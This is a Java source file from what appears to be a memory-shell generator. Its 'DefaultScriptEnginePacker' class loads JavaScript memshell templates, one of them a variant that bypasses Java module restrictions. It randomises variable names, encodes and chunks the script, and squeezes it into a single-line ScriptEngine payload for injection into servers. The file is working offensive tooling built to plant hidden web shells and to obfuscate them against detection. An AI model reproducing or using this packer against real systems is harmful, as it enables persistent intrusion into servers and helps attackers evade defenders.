package org.leo.jmg.mem.packer.scriptengine;

import org.leo.jmg.mem.packer.ClassPackerConfig;
import org.leo.jmg.mem.packer.Packer;
import org.leo.jmg.mem.packer.PackerMeta;
import org.leo.jmg.mem.packer.TemplateRenderer;
import org.leo.jmg.mem.packer.Util;

@PackerMeta(name = "DefaultScriptEngine", group = "ScriptEngine", order = 1)
public class DefaultScriptEnginePacker implements Packer {
    private final String jsTemplate = Util.loadTemplateFromResource("/memshell-template/ScriptEngine.js");
    private final String jsBypassModuleTemplate = Util.loadTemplateFromResource("/memshell-template/ScriptEngineBypassModule.js");

    @Override
    public String pack(ClassPackerConfig config) {
        String template = config.isByPassJavaModule() ? jsBypassModuleTemplate : jsTemplate;
        // TemplateRenderer 在渲染阶段完成变量名随机化（{{VAR:x}} 占位符）
        String script = TemplateRenderer.render(template, config);
        return scriptToSingleLine(Util.chunkPayload(Util.ghostBitsEncodeJs(script)));
    }

    public static String scriptToSingleLine(String script) {
        return script.replace("\n", "")
                .replaceAll("(?m)^[ \t]+|[ \t]+$", "")
                .replaceAll("[ \t]{2,}", " ");
    }
}
